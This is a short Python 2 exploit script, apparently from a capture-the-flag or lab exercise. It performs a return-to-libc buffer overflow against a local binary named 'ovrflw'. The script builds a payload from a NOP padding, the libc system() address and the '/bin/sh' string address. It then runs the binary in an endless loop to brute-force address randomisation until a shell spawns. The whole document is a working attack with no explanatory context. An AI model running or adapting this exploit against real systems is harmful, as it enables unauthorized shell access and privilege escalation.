import struct, subprocess

libcBase = 0xb759d000
systemOffset = 0x00040310
binShOffset = 0x00162bac
libcAddress = struct.pack("<I", libcBase+systemOffset)
exitAddress = struct.pack("<I", 0xd34db33f)
binShAddress = struct.pack("<I", libcBase+binShOffset)

payload = "\x90"*112
payload += libcAddress
payload += exitAddress
payload += binShAddress

i = 0
while True:
    i += 1
    if i%10 == 0:
        print "Attempts: " + str(i)
    subprocess.call(["/usr/local/bin/ovrflw", payload])
